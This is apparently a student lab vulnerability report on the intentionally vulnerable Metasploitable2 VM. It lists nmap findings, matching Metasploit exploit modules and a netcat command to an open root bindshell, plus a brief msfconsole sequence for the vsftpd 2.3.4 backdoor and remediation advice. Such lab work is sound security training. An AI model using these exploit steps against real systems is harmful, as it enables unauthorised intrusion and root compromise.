# Vulnerability Assessment Report: Metasploitable2

**Target IP**: 192.168.1.4  
**Scan Tool**: Nmap v7.95  
**Scan Date**: July 8, 2025  
**Command Used**:
```bash
nmap -sV -sC -Pn 192.168.1.4
```
##  Summary of Findings

| Port     | Service   | Version             | Vulnerability                          | Exploit Tool                             |
|----------|-----------|---------------------|----------------------------------------|------------------------------------------|
| 21/tcp   | FTP       | vsftpd 2.3.4        | Backdoor RCE (CVE-2011-2523)           | Metasploit (`vsftpd_234_backdoor`)       |
| 22/tcp   | SSH       | OpenSSH 4.7p1       | Weak Key Exchange (low risk)           | –                                        |
| 23/tcp   | Telnet    | Linux telnetd       | Unencrypted Login                      | –                                        |
| 25/tcp   | SMTP      | Postfix smtpd       | SSLv2 Supported (weak)                 | nmap, sslscan                            |
| 80/tcp   | HTTP      | Apache 2.2.8        | Path disclosure, outdated              | Nikto, Gobuster                          |
| 139/445  | SMB       | Samba 3.0.20        | Usermap script RCE                     | Metasploit (`samba_usermap_script`)      |
| 1524/tcp | Bindshell | Metasploitable      | Open shell (root access)               | `nc 192.168.1.4 1524`                     |
| 3306/tcp | MySQL     | 5.0.51a             | Weak authentication                    | Manual brute-force                       |
| 5432/tcp | Postgres  | PostgreSQL 8.3.x    | Old version, weak creds                | Hydra, `psql`                            |
| 5900/tcp | VNC       | Protocol 3.3        | Weak/no auth                           | `vncviewer`, Hydra                       |
| 6667/tcp | IRC       | UnrealIRCd          | Backdoor RCE                           | Metasploit (`unreal_ircd_3281_backdoor`) |
| 8180/tcp | Tomcat    | Tomcat 5.5          | Default creds, RCE                     | `tomcat_mgr_deploy`                      |

---

##  Example Exploitation

###  FTP Backdoor Exploit (vsftpd 2.3.4)
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.4
run
```
---

##  Notes

- This VM is intentionally vulnerable (Metasploitable2).
- Do **not** test these techniques on real-world systems without permission.
- This lab is for **ethical learning** purposes only.
---

##  Recommendations

| Risk Level | Action |
|------------|--------|
| 🔴 Critical | Remove `vsftpd 2.3.4`, UnrealIRCd, bind shells |
| 🟡 Medium   | Disable Telnet, update Samba, MySQL, PostgreSQL |
| 🟢 Low      | Upgrade Apache, remove unused services           |
